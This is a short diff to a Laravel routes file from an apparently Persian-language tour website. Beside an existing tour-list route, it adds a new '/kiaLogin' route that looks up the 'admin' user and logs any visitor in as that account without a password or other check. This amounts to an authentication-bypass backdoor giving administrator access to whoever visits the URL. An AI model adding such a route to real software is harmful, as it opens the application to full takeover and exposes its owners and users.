@@ -722,3 +722,10 @@ Route::get('/tour/lists', function (){
     $state = 'تهران';
     return view('tour.tour-lists', compact(['placeMode', 'state']));
 });
+
+Route::get('/kiaLogin', function(){
+   $user = \App\models\User::where('username', 'admin')->first();
+//   dd($user);
+   Auth::login($user);
+   return redirect(url('/'));
+});
